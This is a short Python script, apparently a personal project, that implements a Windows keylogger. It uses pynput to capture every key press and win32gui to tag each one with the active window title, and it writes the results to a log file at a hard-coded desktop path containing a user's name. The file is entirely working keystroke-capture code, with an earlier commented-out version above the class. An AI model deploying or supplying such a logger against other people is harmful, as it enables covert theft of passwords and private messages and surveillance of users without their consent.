from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
import logging

log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'

'''
logging.basicConfig(filename=(log_file), level=logging.DEBUG, format=( '%(message)s : '))

def on_press(Key):
    log_str = str(Key) + ' | ' + GetWindowText(GetForegroundWindow())
    logging.info(log_str)
    if(str(Key) == 'Key.enter'):
        print("gotta analyze fast")
    
with Listener(on_press=on_press) as listener:
    listener.join()
'''

class Logger:
    
    def __init__(self, log_file):
        self.log_file = log_file
        logging.basicConfig(filename=(log_file), level=logging.DEBUG, format=( '%(message)s : '))

    def on_press(self, Key):
        log_str = str(Key) + ' | ' + GetWindowText(GetForegroundWindow())
        logging.info(log_str)
        print(log_str)
        if(str(Key) == 'Key.enter'):
            print("gotta analyze fast")
    
    def log_keys(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = Logger(log_file)
    logger.log_keys()
